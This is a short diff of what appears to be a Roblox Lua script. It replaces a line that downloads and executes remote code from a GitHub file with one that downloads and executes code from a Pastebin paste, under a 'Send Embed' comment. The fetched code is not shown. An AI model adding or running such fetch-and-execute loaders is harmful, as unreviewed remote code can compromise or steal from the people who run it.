@@ -12,4 +12,4 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Zorik0/Rstuff/main/th
   end
 
 --[[Send Embed]]
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zorik0/Rstuff/main/s_execute.lua"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/ci6eWmab"))()
